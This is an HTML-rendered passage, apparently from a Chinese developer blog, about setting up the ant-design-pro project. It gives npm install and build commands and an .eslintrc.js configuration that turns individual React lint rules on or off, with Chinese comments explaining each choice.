&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/ant-design/ant-design-pro
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;安装依赖包&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; npm i -dd  &lt;span class=&quot;c&quot;&gt;# 等待的时间很长。【可以代理出去速度更快】&lt;/span&gt;

 npm start &lt;span class=&quot;c&quot;&gt;# 启动&lt;/span&gt;

 npm run build:aot:prod &lt;span class=&quot;c&quot;&gt;# 编译&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;修改配置文件 &lt;code class=&quot;highlighter-rouge&quot;&gt;.eslintrc.js&lt;/code&gt; WebStorm 最新版2018 可能会报错，所以需要修改&lt;code class=&quot;highlighter-rouge&quot;&gt;.eslintrc.js&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'babel-eslint'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;extends&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'airbnb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'prettier'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;browser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;es6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;mocha&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;jest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;jasmine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 布尔值类型的 propTypes 的 name 必须为 is 或 has 开头&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 propTypes&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/boolean-prop-naming&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 一个 defaultProps 必须有对应的 propTypes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 propTypes&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/default-props-match-prop-types&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 组件必须有 displayName 属性&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 displayName&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/display-name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在自定义组件中使用一些指定的 props&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/forbid-component-props&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用一些指定的 elements&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/forbid-elements&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用一些指定的 propTypes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 propTypes&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/forbid-prop-types&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止直接使用别的组建的 propTypes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 propTypes&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/forbid-foreign-prop-types&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用数组的 index 作为 key&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 太严格了&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-array-index-key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 children 做 props&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-children-prop&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 dangerouslySetInnerHTML&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-danger&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在使用了 dangerouslySetInnerHTML 的组建内添加 children&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-danger-with-children&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用已废弃的 api&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-deprecated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在 componentDidMount 里面使用 setState&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 同构应用需要在 didMount 里写 setState&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-did-mount-set-state&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在 componentDidUpdate 里面使用 setState&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-did-update-set-state&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止直接修改 this.state&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-direct-mutation-state&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 findDOMNode&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-find-dom-node&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 isMounted&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-is-mounted&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在一个文件创建两个组件&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 有一个 bug https://github.com/yannickcr/eslint-plugin-react/issues/1181&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-multi-comp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在 PureComponent 中使用 shouldComponentUpdate&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-redundant-should-component-update&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 ReactDOM.render 的返回值&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-render-return-value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 setState&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off setState 很常用&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-set-state&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止拼写错误&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-typos&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用字符串 ref&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-string-refs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在组件的内部存在未转义的 &amp;gt;, &quot;, &quot; 或 }&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-unescaped-entities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 禁止出现 HTML 中的属性，如 class&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-unknown-property&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止出现未使用的 propTypes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 propTypes&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-unused-prop-types&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 定义过的 state 必须使用&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没有官方文档，并且存在很多 bug： https://github.com/yannickcr/eslint-plugin-react/search?q=no-unused-state&amp;amp;type=Issues&amp;amp;utf8=%E2%9C%93&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-unused-state&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在 componentWillUpdate 中使用 setState&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/no-will-update-set-state&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 必须使用 Class 的形式创建组件&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/prefer-es6-class&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;always&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable props 与 value 之间的等号前后禁止有空格&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-equals-spacing&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;never&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 数组中的 jsx 必须有 key&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 限制每行的 props 数量&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-max-props-per-line&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// jsx 中禁止使用 bind&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 太严格了&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-no-bind&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在 jsx 中使用像注释的字符串&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-no-comment-textnodes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止在 jsx 中出现字符串&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-no-literals&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 target=&quot;_blank&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-no-target-blank&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用未定义的 jsx elemet&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-no-undef&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止使用 pascal 写法的 jsx，比如 &amp;lt;TEST_COMPONENT&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-pascal-case&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable props 必须排好序&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-sort-props&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 限制文件后缀&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-filename-extension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

    &lt;span class=&quot;s2&quot;&gt;&quot;import/prefer-default-export&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 禁止出现重复的 props&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-no-duplicate-props&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable jsx 的开始和闭合处禁止有空格&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;prefer-destructuring&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-tag-spacing&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;object-shorthand&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// &quot;react/jsx-tag-spacing&quot;: [&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   &quot;error&quot;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   {&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     &quot;closingSlash&quot;: &quot;never&quot;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     &quot;beforeSelfClosing&quot;: &quot;always&quot;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     &quot;afterOpening&quot;: &quot;never&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   }&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ],&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// jsx 文件必须 import React&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-uses-react&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 定义了的 jsx element 必须使用&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-uses-vars&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 多行的 jsx 必须有括号包起来&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-wrap-multilines&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @fixable 第一个 prop 必须得换行&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-first-prop-new-line&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// handler 的名称必须是 onXXX 或 handleXXX&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/jsx-handler-names&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 必须使用 pure function&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 没必要限制&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/prefer-stateless-function&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 组件必须写 propTypes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 propTypes&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/prop-types&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 出现 jsx 的地方必须 import React&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 已经在 no-undef 中限制了&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/react-in-jsx-scope&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 非 required 的 prop 必须有 defaultProps&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// @off 不强制要求写 propTypes&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;react/require-default-props&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
